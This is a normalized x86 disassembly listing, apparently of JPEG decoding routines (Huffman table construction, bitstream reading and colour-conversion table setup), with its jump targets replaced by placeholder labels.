mov [ esp + 0x3c ] edx
mov eax [ esp + 0x4 ]
mov ecx [ esp + 0x4 ]
mov ebx [ eax + 0xc ]
mov eax [ esp + 0x4 ]
mov esi [ ecx + 0x8 ]
add eax 0x10
mov [ esp + 0x4c ] eax
mov edx [ esp + 0x4 ]
mov ecx [ edx + 0x14 ]
mov [ esp + 0x18 ] ecx
mov eax [ edi ]
mov [ esp + 0x1c ] eax
xor eax eax
mov edx [ esp + 0x4 ]
mov ecx [ edx + 0x3c ]
mov [ esp + 0x24 ] ecx
mov [ esp + 0x28 ] eax
mov edx [ esp ]
mov ecx [ edx + 0x182 ]
mov [ esp + 0x14 ] ecx
cmp [ esp + 0x18 ] 0x0
jne r-xdata
mov eax [ esp + 0x4 ]
cmp [ eax + 0x28 ] 0x0
jne r-xdata
cmp [ esp + 0x18 ] 0x0
jbe r-xdata
mov eax [ esp + 0x28 ]
lea edx [ esp + eax * 4 + 0x50 ]
mov [ esp + 0x30 ] edx
mov ecx [ esp + 0x14 ]
lea eax [ ecx * 4 + rw-data ]
mov [ esp + 0x2c ] eax
mov edx [ esp + 0x14 ]
cmp edx [ esp + 0x8 ]
jg r-xdata
mov eax [ esp ]
call sub_45be80
test eax eax
jne r-xdata
mov edx [ esp ]
mov eax [ edx + 0x14 ]
mov edx [ esp + 0x34 ]
mov [ eax ] edx
mov ecx [ esp + 0x38 ]
mov [ eax + 0x4 ] ecx
mov eax [ esp ]
mov edx [ esp + 0x3c ]
mov [ eax + 0x192 ] edx
mov ecx [ esp + 0x4 ]
mov [ ecx + 0x8 ] esi
mov eax [ esp + 0x4 ]
mov [ eax + 0xc ] ebx
mov edx [ esp + 0x4 ]
mov ecx [ esp + 0x18 ]
mov [ edx + 0x14 ] ecx
mov eax [ esp + 0x4 ]
dec [ eax + 0x28 ]
mov eax 0x1
jmp r-xdata
mov edx [ esp + 0x14 ]
cmp edx [ esp + 0x8 ]
jg r-xdata
cmp ebx 0x8
jge r-xdata
xor eax eax
jmp r-xdata
add esp 0x150
pop ebp
pop edi
pop esi
pop ebx
retn
dec [ esp + 0x18 ]
mov ecx [ esp + 0x14 ]
mov eax [ ecx * 4 + rw-data ]
add eax eax
add eax [ esp + 0x1c ]
mov [ esp + 0x20 ] eax
mov edx [ esp + 0x20 ]
cmp [ edx ] 0x0
je r-xdata
lea ecx [ ebx - 0x8 ]
mov eax esi
sar eax cl
and eax 0xff
mov edx [ esp + 0x24 ]
mov ebp [ edx + eax * 4 + 0xd4 ]
test ebp ebp
je r-xdata
push 0x0
lea eax [ esp + 0x38 ]
mov ecx ebx
mov edx esi
call sub_45cce0
test eax eax
je r-xdata
inc [ esp + 0x14 ]
mov eax [ esp + 0x14 ]
cmp eax [ esp + 0x8 ]
jle r-xdata
cmp ebx 0x1
jge r-xdata
mov ebp 0x9
sub ebx ebp
mov edx [ esp + 0x24 ]
movzx edi [ edx + eax + 0x4d4 ]
jmp r-xdata
mov edx [ esp + 0x28 ]
cmp [ esp + 0x28 ] 0x0
lea eax [ esp + edx * 4 + 0x50 ]
jle r-xdata
mov esi [ esp + 0x40 ]
mov ebx [ esp + 0x44 ]
cmp ebx 0x8
jge r-xdata
dec ebx
mov ecx ebx
mov eax esi
sar eax cl
test al 0x1
je r-xdata
push 0x1
lea eax [ esp + 0x38 ]
mov ecx ebx
mov edx esi
call sub_45cce0
test eax eax
je r-xdata
mov esi [ esp + 0x40 ]
mov ebx [ esp + 0x44 ]
mov ebp edi
sar ebp 0x4
and edi 0xf
test edi edi
je r-xdata
xor eax eax
dec [ esp + 0x28 ]
add eax 0xfffffffc
mov edx [ eax ]
mov ecx [ esp + 0x1c ]
mov [ ecx + edx * 2 ] 0x0
cmp [ esp + 0x28 ] 0x0
jg r-xdata
mov ebp 0x1
jmp r-xdata
mov edx [ esp + 0x20 ]
mov ax [ edx ]
movsx edx ax
and edx [ esp + 0xc ]
jne r-xdata
mov esi [ esp + 0x40 ]
mov ebx [ esp + 0x44 ]
cmp ebp 0xf
je r-xdata
dec edi
je r-xdata
mov eax [ esp + 0x24 ]
push eax
push ebp
lea eax [ esp + 0x3c ]
mov ecx ebx
mov edx esi
call sub_45cdf0
mov edi eax
test eax eax
jl r-xdata
test ax ax
jl r-xdata
mov edx [ esp + 0x2c ]
mov eax [ edx ]
add eax eax
add eax [ esp + 0x1c ]
mov [ esp + 0x20 ] eax
mov edx [ esp + 0x20 ]
cmp [ edx ] 0x0
je r-xdata
mov ecx ebp
mov edi 0x1
shl edi cl
mov [ esp + 0x18 ] edi
test ebp ebp
je r-xdata
cmp ebx 0x1
jge r-xdata
mov eax [ esp ]
mov edx [ eax ]
mov [ edx + 0x14 ] 0x72
or edx 0xffffffff
mov eax [ esp ]
mov ecx [ eax ]
call [ ecx + 0x4 ]
mov edx [ esp + 0x20 ]
mov cx [ esp + 0x10 ]
add [ edx ] cx
mov ecx [ esp + 0x20 ]
mov ax [ esp + 0xc ]
add [ ecx ] ax
jmp r-xdata
dec ebp
js r-xdata
cmp ebx 0x1
jge r-xdata
cmp ebp ebx
jle r-xdata
dec ebx
mov ecx ebx
mov eax esi
sar eax cl
test al 0x1
je r-xdata
push 0x1
lea eax [ esp + 0x38 ]
mov ecx ebx
mov edx esi
call sub_45cce0
test eax eax
je r-xdata
test edi edi
je r-xdata
inc [ esp + 0x14 ]
add [ esp + 0x2c ] 0x4
mov eax [ esp + 0x14 ]
cmp eax [ esp + 0x8 ]
jle r-xdata
dec ebx
mov ecx ebx
mov eax esi
sar eax cl
test al 0x1
je r-xdata
push 0x1
lea eax [ esp + 0x38 ]
mov ecx ebx
mov edx esi
call sub_45cce0
test eax eax
je r-xdata
sub ebx ebp
mov eax esi
mov ecx ebx
dec edi
sar eax cl
and eax edi
mov ebp eax
add [ esp + 0x18 ] ebp
jmp r-xdata
push ebp
lea eax [ esp + 0x38 ]
mov ecx ebx
mov edx esi
call sub_45cce0
test eax eax
je r-xdata
mov edi [ esp + 0x10 ]
jmp r-xdata
mov edi [ esp + 0xc ]
jmp r-xdata
mov esi [ esp + 0x40 ]
mov ebx [ esp + 0x44 ]
inc [ esp + 0x14 ]
add [ esp + 0x2c ] 0x4
mov eax [ esp + 0x14 ]
cmp eax [ esp + 0x8 ]
jle r-xdata
mov edx [ esp + 0x2c ]
mov eax [ edx ]
mov edx [ esp + 0x1c ]
mov [ edx + eax * 2 ] di
mov ecx [ esp + 0x30 ]
mov [ ecx ] eax
inc [ esp + 0x28 ]
add [ esp + 0x30 ] 0x4
mov edx [ esp + 0x20 ]
mov ax [ edx ]
movsx edx ax
and edx [ esp + 0xc ]
jne r-xdata
mov esi [ esp + 0x40 ]
mov ebx [ esp + 0x44 ]
mov esi [ esp + 0x40 ]
mov ebx [ esp + 0x44 ]
test ax ax
jl r-xdata
mov edx [ esp + 0x20 ]
mov cx [ esp + 0x10 ]
add [ edx ] cx
jmp r-xdata
mov ecx [ esp + 0x20 ]
mov ax [ esp + 0xc ]
add [ ecx ] ax
jmp r-xdata
sub_45c934
push ebx
mov ebx eax
mov eax ebx
push esi
mov ecx 0x40
mov edx 0x1
mov esi [ eax + 0x4 ]
call [ esi ]
mov edx eax
mov [ ebx + 0x1ae ] edx
mov [ edx ] sub_45bbdc
xor eax eax
lea ecx [ edx + 0x2c ]
mov edx ecx
xor ecx ecx
inc eax
mov [ edx ] ecx
add edx 0x4
cmp eax 0x4
jl r-xdata
mov eax ebx
mov ecx [ ebx + 0x20 ]
shl ecx 0x6
mov edx 0x1
mov esi [ eax + 0x4 ]
shl ecx 0x2
call [ esi ]
mov esi eax
mov [ ebx + 0x9c ] esi
mov edx esi
xor ecx ecx
jmp r-xdata
cmp ecx [ ebx + 0x20 ]
jl r-xdata
xor eax eax
pop esi
pop ebx
retn
mov [ edx ] 0xffffffff
add edx 0x4
inc eax
cmp eax 0x40
jl r-xdata
inc ecx
sub_45c9a8
push ebx
push esi
mov ebx eax
push edi
push ebp
add esp 0xfffffff4
cmp [ ebx + 0x182 ] 0x0
mov ebp [ ebx + 0x1ae ]
jne r-xdata
mov eax [ ebx ]
mov [ eax + 0x14 ] 0x76
or edx 0xffffffff
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x4 ]
cmp [ ebx + 0x186 ] 0x3f
jne r-xdata
mov edx [ esp ]
cmp edx [ ebx + 0x13a ]
jl r-xdata
cmp [ ebx + 0x18a ] 0x0
jne r-xdata
mov ecx [ esp + 0x4 ]
mov eax [ ecx ]
mov esi [ eax + 0x14 ]
mov edi [ eax + 0x18 ]
test esi esi
jl r-xdata
xor ecx ecx
mov [ ebp + 0xc ] ecx
xor eax eax
mov [ ebp + 0x8 ] eax
xor edx edx
mov [ ebp + 0x10 ] edx
mov ecx [ ebx + 0x110 ]
mov [ ebp + 0x24 ] ecx
add esp 0xc
pop ebp
pop edi
pop esi
pop ebx
retn
cmp [ ebx + 0x18e ] 0x0
je r-xdata
mov eax [ ebx ]
mov [ eax + 0x14 ] 0x31
mov [ eax + 0x18 ] esi
mov eax ebx
mov edx [ eax ]
call [ edx ]
cmp esi 0x4
jge r-xdata
xor edx edx
mov [ esp ] edx
lea eax [ ebp + 0x14 ]
mov [ esp + 0x8 ] eax
lea edx [ ebx + 0x13e ]
mov [ esp + 0x4 ] edx
jmp r-xdata
mov eax [ ebx ]
mov [ eax + 0x14 ] 0x31
mov [ eax + 0x18 ] edi
mov eax ebx
mov edx [ eax ]
call [ edx ]
cmp edi 0x4
jge r-xdata
cmp [ ebx + esi * 4 + 0xb0 ] 0x0
jne r-xdata
cmp [ ebx + edi * 4 + 0xc0 ] 0x0
jne r-xdata
test edi edi
jl r-xdata
lea ecx [ ebp + esi * 4 + 0x28 ]
mov edx [ ebx + esi * 4 + 0xb0 ]
mov eax ebx
call sub_45cac8
lea ecx [ ebp + edi * 4 + 0x38 ]
mov edx [ ebx + edi * 4 + 0xc0 ]
mov eax ebx
call sub_45cac8
mov ecx [ esp + 0x8 ]
xor eax eax
mov [ ecx ] eax
inc [ esp ]
add [ esp + 0x8 ] 0x4
add [ esp + 0x4 ] 0x4
sub_45cac8
push ebx
push esi
push edi
add esp 0xfffffad8
mov ebx ecx
mov edi eax
mov [ esp ] edx
lea esi [ esp + 0x20 ]
cmp [ ebx ] 0x0
jne r-xdata
mov eax [ ebx ]
mov edi 0x1
mov [ esp + 0x4 ] eax
xor eax eax
mov edx [ esp + 0x4 ]
mov ecx [ esp ]
mov [ edx + 0xd0 ] ecx
mov [ esp + 0x8 ] eax
mov eax [ esp ]
lea ecx [ eax + 0x1 ]
mov eax edi
mov ecx 0x5d4
mov edx 0x1
mov edi [ eax + 0x4 ]
call [ edi ]
mov [ ebx ] eax
xor ebx ebx
mov bl [ edx ]
cmp ebx [ esp + 0xc ]
jge r-xdata
mov ebx edi
mov [ eax ] bl
inc [ esp + 0x8 ]
inc eax
inc [ esp + 0xc ]
inc edi
inc ecx
cmp edi 0x10
jle r-xdata
mov [ esp + 0xc ] 0x1
mov edx [ esp + 0x8 ]
lea eax [ esi + edx ]
mov edx ecx
jmp r-xdata
mov eax [ esp + 0x8 ]
xor ecx ecx
mov [ esi + eax ] 0x0
xor eax eax
movsx ebx [ esi ]
mov [ esp + 0x8 ] eax
jmp r-xdata
mov eax [ esp + 0x8 ]
cmp [ esi + eax ] 0x0
jne r-xdata
mov edx [ esp + 0x8 ]
mov eax [ esp + 0x8 ]
lea eax [ esi + eax ]
lea edx [ esp + edx * 4 + 0x124 ]
jmp r-xdata
xor edx edx
mov edi 0x1
mov [ esp + 0x8 ] edx
mov eax [ esp + 0x4 ]
mov edx [ esp ]
add eax 0x90
inc edx
movsx edi [ eax ]
cmp ebx edi
je r-xdata
mov [ eax - 0x48 ] 0xffffffff
mov ecx [ esp + 0x8 ]
mov [ eax ] ecx
mov ecx [ esp + 0x8 ]
mov ecx [ esp + ecx * 4 + 0x124 ]
mov [ eax - 0x8c ] ecx
xor ecx ecx
mov cl [ edx ]
add [ esp + 0x8 ] ecx
mov ecx [ esp + 0x8 ]
mov ecx [ esp + ecx * 4 + 0x120 ]
mov [ eax - 0x48 ] ecx
jmp r-xdata
mov [ edx ] ecx
add edx 0x4
inc [ esp + 0x8 ]
inc eax
inc ecx
add ecx ecx
inc ebx
cmp [ edx ] 0x0
je r-xdata
mov eax [ esp + 0x4 ]
mov [ eax + 0x88 ] 0xfffff
push 0x400
push 0x0
mov edx [ esp + 0xc ]
add edx 0xd4
push edx
call sub_46a318
add esp 0xc
xor eax eax
mov [ esp + 0x8 ] eax
mov edi 0x1
mov eax [ esp ]
lea edx [ eax + 0x1 ]
mov [ esp + 0x1c ] edx
inc edi
add eax 0x4
inc edx
cmp edi 0x10
jle r-xdata
mov eax [ esp + 0x10 ]
xor edx edx
mov dl [ eax ]
cmp edx [ esp + 0xc ]
jge r-xdata
mov eax [ esp + 0x14 ]
mov edx 0x8
sub edx edi
mov ebx [ esp + 0x18 ]
mov ecx edx
mov eax [ eax ]
shl eax cl
mov ecx edx
mov edx 0x1
shl edx cl
mov ecx edx
mov edx [ esp + 0x4 ]
mov esi ebx
mov ebx [ esp + 0x4 ]
lea edx [ edx + eax + 0x4d4 ]
test ecx ecx
lea eax [ ebx + eax * 4 + 0xd4 ]
jle r-xdata
inc edi
inc [ esp + 0x1c ]
cmp edi 0x8
jle r-xdata
inc [ esp + 0xc ]
add [ esp + 0x14 ] 0x4
inc [ esp + 0x18 ]
inc [ esp + 0x8 ]
mov [ eax ] edi
add eax 0x4
mov bl [ esi ]
dec ecx
mov [ edx ] bl
inc edx
test ecx ecx
jg r-xdata
mov [ esp + 0xc ] 0x1
mov ecx [ esp ]
mov eax [ esp + 0x8 ]
lea edx [ ecx + eax + 0x11 ]
mov [ esp + 0x18 ] edx
mov ecx [ esp + 0x8 ]
lea eax [ esp + ecx * 4 + 0x124 ]
mov [ esp + 0x14 ] eax
mov edx [ esp + 0x1c ]
mov ecx edx
mov [ esp + 0x10 ] ecx
jmp r-xdata
add esp 0x528
pop edi
pop esi
pop ebx
retn
sub_45cce0
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov ebx eax
push esi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi [ ebx ]
mov eax [ ebx + 0x4 ]
mov [ ebp - 0xc ] eax
cmp [ ebp - 0x8 ] 0x19
jge r-xdata
mov [ ebx ] esi
mov ecx [ ebp - 0xc ]
mov [ ebx + 0x4 ] ecx
mov eax [ ebp - 0x4 ]
mov [ ebx + 0xc ] eax
mov eax 0x1
mov edx [ ebp - 0x8 ]
mov [ ebx + 0x10 ] edx
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
mov edx [ ebp - 0x8 ]
cmp edx [ ebp + 0x8 ]
jge r-xdata
cmp [ ebp - 0xc ] 0x0
jne r-xdata
mov ecx [ ebx + 0x18 ]
cmp [ ecx ] 0x0
jne r-xdata
dec [ ebp - 0xc ]
xor eax eax
mov al [ esi ]
inc esi
cmp eax 0xff
jne r-xdata
mov eax [ ebx + 0x14 ]
mov edx [ eax + 0x14 ]
call [ edx + 0xc ]
test eax eax
jne r-xdata
xor eax eax
mov eax [ ebx + 0x14 ]
mov edx [ eax ]
mov [ edx + 0x14 ] 0x71
or edx 0xffffffff
mov ecx [ eax ]
call [ ecx + 0x4 ]
mov eax [ ebx + 0x18 ]
mov [ eax ] 0x1
mov edx [ ebp - 0x4 ]
shl edx 0x8
or eax edx
mov [ ebp - 0x4 ] eax
add [ ebp - 0x8 ] 0x8
cmp [ ebp - 0x8 ] 0x19
jl r-xdata
cmp [ ebp - 0xc ] 0x0
jne r-xdata
mov edx [ ebx + 0x14 ]
mov eax [ edx + 0x14 ]
mov esi [ eax ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0xc ] eax
xor eax eax
jmp r-xdata
dec [ ebp - 0xc ]
xor eax eax
mov al [ esi ]
inc esi
cmp eax 0xff
je r-xdata
mov eax [ ebx + 0x14 ]
mov edx [ eax + 0x14 ]
call [ edx + 0xc ]
test eax eax
jne r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
test eax eax
jne r-xdata
mov edx [ ebx + 0x14 ]
mov eax [ edx + 0x14 ]
mov esi [ eax ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0xc ] eax
xor eax eax
jmp r-xdata
mov [ ebx + 0x8 ] eax
mov eax 0xff
jmp r-xdata
sub_45cdf0
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov ebx ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov edi [ ebp + 0x8 ]
cmp edi ebx
jle r-xdata
sub ebx edi
mov esi [ ebp - 0x8 ]
mov ecx ebx
mov eax 0x1
sar esi cl
mov ecx edi
mov edx [ ebp + 0xc ]
shl eax cl
dec eax
and esi eax
lea eax [ edx + edi * 4 + 0x44 ]
mov [ ebp - 0xc ] eax
jmp r-xdata
push edi
mov ecx ebx
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_45cce0
test eax eax
jne r-xdata
mov edx [ ebp - 0xc ]
cmp esi [ edx ]
jg r-xdata
mov edx [ ebp - 0x4 ]
mov ecx [ edx + 0xc ]
mov [ ebp - 0x8 ] ecx
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x10 ]
or eax 0xffffffff
jmp r-xdata
add esi esi
cmp ebx 0x1
jge r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
cmp edi 0x10
mov [ eax + 0xc ] edx
mov ecx [ ebp - 0x4 ]
mov [ ecx + 0x10 ] ebx
jle r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
dec ebx
mov ecx ebx
mov eax [ ebp - 0x8 ]
sar eax cl
and eax 0x1
or esi eax
inc edi
add [ ebp - 0xc ] 0x4
push 0x1
mov ecx ebx
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_45cce0
test eax eax
jne r-xdata
mov edx [ ebp + 0xc ]
mov ecx [ ebp + 0xc ]
sub esi [ edx + edi * 4 ]
mov edx [ ebp + 0xc ]
mov eax [ ecx + edi * 4 + 0x8c ]
mov ecx [ edx + 0xd0 ]
lea eax [ ecx + eax ]
movzx eax [ eax + esi + 0x11 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov edx [ eax ]
mov [ edx + 0x14 ] 0x72
or edx 0xffffffff
mov ecx [ eax ]
call [ ecx + 0x4 ]
xor eax eax
jmp r-xdata
mov edx [ ebp - 0x4 ]
mov ecx [ edx + 0xc ]
mov [ ebp - 0x8 ] ecx
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x10 ]
or eax 0xffffffff
jmp r-xdata
sub_45cef4
push ebx
mov ebx eax
push esi
mov esi [ ebx + 0x1ae ]
mov eax [ esi + 0xc ]
test eax eax
jns r-xdata
sar eax 0x3
mov edx [ ebx + 0x1aa ]
add [ edx + 0x5c ] eax
xor ecx ecx
mov [ esi + 0xc ] ecx
mov eax ebx
mov edx [ eax + 0x1aa ]
call [ edx + 0x8 ]
test eax eax
jne r-xdata
add eax 0x7
xor edx edx
lea eax [ esi + 0x14 ]
jmp r-xdata
xor eax eax
pop esi
pop ebx
retn
cmp edx [ ebx + 0x13a ]
jl r-xdata
xor ecx ecx
inc edx
mov [ eax ] ecx
add eax 0x4
mov edx [ ebx + 0x110 ]
xor eax eax
mov [ esi + 0x24 ] edx
mov [ esi + 0x10 ] eax
mov eax 0x1
pop esi
pop ebx
retn
sub_45cf5c
push ebx
push esi
push edi
push ebp
add esp 0xffffffa4
mov esi edx
mov [ esp ] eax
mov eax [ esp ]
mov edx [ eax + 0x1ae ]
mov [ esp + 0x4 ] edx
mov ecx [ esp ]
cmp [ ecx + 0x110 ] 0x0
je r-xdata
mov edx [ esp ]
mov [ esp + 0x44 ] edx
mov ecx [ esp ]
mov eax [ ecx + 0x14 ]
mov edx [ eax ]
mov [ esp + 0x30 ] edx
mov ecx [ eax + 0x4 ]
mov [ esp + 0x34 ] ecx
mov eax [ esp ]
mov edx [ eax + 0x192 ]
mov [ esp + 0x38 ] edx
mov eax [ esp + 0x4 ]
mov ecx [ esp + 0x4 ]
mov ebx [ eax + 0xc ]
mov eax [ esp + 0x4 ]
mov edi [ ecx + 0x8 ]
add eax 0x10
mov [ esp + 0x48 ] eax
mov ecx 0x4
mov edx [ esp + 0x4 ]
push esi
push edi
lea edi [ esp + 0x54 ]
lea esi [ edx + 0x14 ]
[ edi ] [ esi ]
pop edi
pop esi
xor eax eax
mov [ esp + 0x8 ] eax
mov eax esi
mov edx [ esp ]
lea ecx [ edx + 0x15a ]
mov [ esp + 0x2c ] ecx
mov [ esp + 0x28 ] eax
jmp r-xdata
mov eax [ esp + 0x4 ]
cmp [ eax + 0x24 ] 0x0
jne r-xdata
mov eax [ esp ]
mov edx [ eax + 0x156 ]
cmp edx [ esp + 0x8 ]
jg r-xdata
mov eax [ esp ]
call sub_45cef4
test eax eax
jne r-xdata
mov edx [ esp + 0x28 ]
mov ecx [ edx ]
mov [ esp + 0x10 ] ecx
mov eax [ esp + 0x2c ]
mov edx [ eax ]
mov [ esp + 0xc ] edx
mov ecx [ esp ]
mov eax [ esp + 0xc ]
mov ebp [ ecx + eax * 4 + 0x13e ]
mov eax [ ebp + 0x14 ]
mov edx [ esp + 0x4 ]
mov ecx [ edx + eax * 4 + 0x28 ]
mov [ esp + 0x14 ] ecx
mov eax [ ebp + 0x18 ]
mov edx [ esp + 0x4 ]
mov ecx [ edx + eax * 4 + 0x38 ]
mov [ esp + 0x18 ] ecx
cmp ebx 0x8
jge r-xdata
mov ecx [ esp ]
mov edx [ esp + 0x30 ]
lea esi [ esp + 0x4c ]
mov eax [ ecx + 0x14 ]
mov [ eax ] edx
mov ecx [ esp + 0x34 ]
mov [ eax + 0x4 ] ecx
mov eax [ esp ]
mov edx [ esp + 0x38 ]
mov [ eax + 0x192 ] edx
mov ecx [ esp + 0x4 ]
mov [ ecx + 0x8 ] edi
mov ecx 0x4
mov eax [ esp + 0x4 ]
mov [ eax + 0xc ] ebx
mov edx [ esp + 0x4 ]
lea edi [ edx + 0x14 ]
[ edi ] [ esi ]
mov eax [ esp + 0x4 ]
dec [ eax + 0x24 ]
mov eax 0x1
xor eax eax
jmp r-xdata
lea ecx [ ebx - 0x8 ]
mov eax edi
sar eax cl
and eax 0xff
mov edx [ esp + 0x14 ]
mov edx [ edx + eax * 4 + 0xd4 ]
mov [ esp + 0x1c ] edx
test edx edx
je r-xdata
push 0x0
lea eax [ esp + 0x34 ]
mov ecx ebx
mov edx edi
call sub_45cce0
test eax eax
jne r-xdata
add esp 0x5c
pop ebp
pop edi
pop esi
pop ebx
retn
mov [ esp + 0x1c ] 0x9
sub ebx [ esp + 0x1c ]
mov ecx [ esp + 0x14 ]
movzx esi [ ecx + eax + 0x4d4 ]
jmp r-xdata
mov edi [ esp + 0x3c ]
mov ebx [ esp + 0x40 ]
cmp ebx 0x8
jge r-xdata
xor eax eax
jmp r-xdata
mov edi [ esp + 0x3c ]
mov ebx [ esp + 0x40 ]
xor eax eax
jmp r-xdata
test esi esi
je r-xdata
mov [ esp + 0x1c ] 0x1
jmp r-xdata
cmp [ ebp + 0x30 ] 0x0
je r-xdata
cmp esi ebx
jle r-xdata
mov eax [ esp + 0x14 ]
mov ecx ebx
push eax
mov edx [ esp + 0x20 ]
push edx
mov edx edi
lea eax [ esp + 0x38 ]
call sub_45cdf0
mov esi eax
test eax eax
jge r-xdata
mov ebp 0x1
mov eax [ esp + 0xc ]
mov ecx [ esp + 0xc ]
add esi [ esp + eax * 4 + 0x4c ]
mov [ esp + ecx * 4 + 0x4c ] esi
mov eax [ esp + 0x10 ]
mov [ eax ] si
cmp [ ebp + 0x24 ] 0x1
jle r-xdata
sub ebx esi
mov ecx ebx
mov eax edi
sar eax cl
mov ecx esi
mov edx 0x1
shl edx cl
dec edx
and eax edx
cmp eax [ esi * 4 + rw-data ]
jge r-xdata
push esi
lea eax [ esp + 0x34 ]
mov ecx ebx
mov edx edi
call sub_45cce0
test eax eax
jne r-xdata
lea ecx [ ebx - 0x8 ]
mov eax edi
sar eax cl
and eax 0xff
mov edx [ esp + 0x18 ]
mov edx [ edx + eax * 4 + 0xd4 ]
mov [ esp + 0x24 ] edx
test edx edx
je r-xdata
push 0x0
lea eax [ esp + 0x34 ]
mov ecx ebx
mov edx edi
call sub_45cce0
test eax eax
jne r-xdata
mov ebp 0x1
mov edx eax
mov edx [ esi * 4 + rw-data ]
add edx eax
jmp r-xdata
mov edi [ esp + 0x3c ]
mov ebx [ esp + 0x40 ]
xor eax eax
jmp r-xdata
mov [ esp + 0x24 ] 0x9
sub ebx [ esp + 0x24 ]
mov ecx [ esp + 0x18 ]
movzx esi [ ecx + eax + 0x4d4 ]
jmp r-xdata
mov edi [ esp + 0x3c ]
mov ebx [ esp + 0x40 ]
cmp ebx 0x8
jge r-xdata
xor eax eax
jmp r-xdata
lea ecx [ ebx - 0x8 ]
mov eax edi
sar eax cl
and eax 0xff
mov edx [ esp + 0x18 ]
mov edx [ edx + eax * 4 + 0xd4 ]
mov [ esp + 0x20 ] edx
test edx edx
je r-xdata
push 0x0
lea eax [ esp + 0x34 ]
mov ecx ebx
mov edx edi
call sub_45cce0
test eax eax
jne r-xdata
mov esi edx
mov edi [ esp + 0x3c ]
mov ebx [ esp + 0x40 ]
xor eax eax
jmp r-xdata
mov eax esi
sar eax 0x4
and esi 0xf
test esi esi
je r-xdata
mov [ esp + 0x24 ] 0x1
jmp r-xdata
mov [ esp + 0x20 ] 0x9
sub ebx [ esp + 0x20 ]
mov ecx [ esp + 0x18 ]
movzx esi [ ecx + eax + 0x4d4 ]
jmp r-xdata
mov edi [ esp + 0x3c ]
mov ebx [ esp + 0x40 ]
cmp ebx 0x8
jge r-xdata
xor eax eax
jmp r-xdata
cmp eax 0xf
jne r-xdata
add ebp eax
cmp esi ebx
jle r-xdata
mov eax [ esp + 0x18 ]
mov ecx ebx
push eax
mov edx [ esp + 0x28 ]
push edx
mov edx edi
lea eax [ esp + 0x38 ]
call sub_45cdf0
mov esi eax
test eax eax
jge r-xdata
mov edi [ esp + 0x3c ]
mov ebx [ esp + 0x40 ]
xor eax eax
jmp r-xdata
mov eax esi
sar eax 0x4
and esi 0xf
test esi esi
je r-xdata
mov [ esp + 0x20 ] 0x1
jmp r-xdata
inc [ esp + 0x8 ]
add [ esp + 0x2c ] 0x4
add [ esp + 0x28 ] 0x4
add ebp 0xf
sub ebx esi
jmp r-xdata
push esi
lea eax [ esp + 0x34 ]
mov ecx ebx
mov edx edi
call sub_45cce0
test eax eax
jne r-xdata
cmp eax 0xf
jne r-xdata
add ebp eax
cmp esi ebx
jle r-xdata
mov eax [ esp + 0x18 ]
mov ecx ebx
push eax
mov edx [ esp + 0x24 ]
push edx
mov edx edi
lea eax [ esp + 0x38 ]
call sub_45cdf0
mov esi eax
test eax eax
jge r-xdata
cmp ebx 0x8
jge r-xdata
inc ebp
cmp ebp 0x40
jl r-xdata
mov edi [ esp + 0x3c ]
mov ebx [ esp + 0x40 ]
xor eax eax
jmp r-xdata
add ebp 0xf
sub ebx esi
mov ecx ebx
mov eax edi
sar eax cl
mov ecx esi
mov edx 0x1
shl edx cl
dec edx
and eax edx
cmp eax [ esi * 4 + rw-data ]
jge r-xdata
push esi
lea eax [ esp + 0x34 ]
mov ecx ebx
mov edx edi
call sub_45cce0
test eax eax
jne r-xdata
cmp ebx 0x8
jge r-xdata
jmp r-xdata
mov edx eax
mov edx [ esi * 4 + rw-data ]
add edx eax
jmp r-xdata
mov edi [ esp + 0x3c ]
mov ebx [ esp + 0x40 ]
xor eax eax
jmp r-xdata
inc ebp
cmp ebp 0x40
jl r-xdata
mov eax [ ebp * 4 + rw-data ]
mov ecx [ esp + 0x10 ]
mov esi edx
mov [ ecx + eax * 2 ] si
jmp r-xdata
sub_45d3f8
push ebx
mov ebx eax
mov eax ebx
push esi
mov ecx 0x48
mov edx 0x1
mov esi [ eax + 0x4 ]
call [ esi ]
mov [ ebx + 0x1ae ] eax
mov [ eax ] sub_45c9a8
mov [ eax + 0x4 ] sub_45cf5c
xor edx edx
add eax 0x38
xor ecx ecx
mov [ eax ] ecx
mov [ eax - 0x10 ] ecx
inc edx
add eax 0x4
cmp edx 0x4
jl r-xdata
pop esi
pop ebx
retn
sub_45d438
push ebx
push esi
mov esi eax
push edi
mov eax esi
mov ecx 0x400
mov ebx [ esi + 0x1b6 ]
mov edx 0x1
mov edi [ eax + 0x4 ]
call [ edi ]
mov [ ebx + 0x10 ] eax
mov eax esi
mov ecx 0x400
mov edx 0x1
mov edi [ eax + 0x4 ]
call [ edi ]
mov [ ebx + 0x14 ] eax
mov eax esi
mov ecx 0x400
mov edx 0x1
mov edi [ eax + 0x4 ]
call [ edi ]
mov [ ebx + 0x18 ] eax
mov eax esi
mov ecx 0x400
mov edx 0x1
mov esi [ eax + 0x4 ]
call [ esi ]
mov [ ebx + 0x1c ] eax
xor eax eax
mov edx 0xffffff80
imul ecx edx 0x166e9
add ecx 0x8000
mov esi [ ebx + 0x10 ]
sar ecx 0x10
mov [ esi + eax * 4 ] ecx
imul ecx edx 0x1c5a2
add ecx 0x8000
mov esi [ ebx + 0x14 ]
sar ecx 0x10
mov [ esi + eax * 4 ] ecx
imul ecx edx 0xffff492e
mov esi [ ebx + 0x18 ]
mov [ esi + eax * 4 ] ecx
imul ecx edx 0xffffa7e6
mov esi [ ebx + 0x1c ]
add ecx 0x8000
inc edx
mov [ esi + eax * 4 ] ecx
inc eax
cmp eax 0xff
jle r-xdata
pop edi
pop esi
pop ebx
retn
sub_45d504
